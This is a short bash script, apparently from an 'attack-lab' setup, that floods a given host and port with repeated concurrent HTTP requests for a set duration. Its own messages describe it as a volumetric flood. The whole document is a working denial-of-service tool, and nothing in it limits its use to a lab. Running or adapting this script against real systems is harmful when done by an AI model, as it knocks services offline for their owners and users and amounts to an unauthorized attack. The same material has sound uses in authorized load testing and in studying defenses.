#!/bin/bash

TARGET=$1
PORT=$2
DURATION=$3

echo "[attack-lab] Starting volumetric flood against $TARGET:$PORT ${DURATION}s"
echo "[attack-lab] Timestamp: $(date '+%H:%M:%S')"

end=$((SECONDS + DURATION))
while [ $SECONDS -lt $end ]; do
    curl -s "http://$TARGET:$PORT/" -o /dev/null --max-time 1 &
    curl -s "http://$TARGET:$PORT/" -o /dev/null --max-time 1 &
    curl -s "http://$TARGET:$PORT/" -o /dev/null --max-time 1 &
    wait
done

echo "[attack-lab] Flood finished at $(date '+%H:%M:%S')"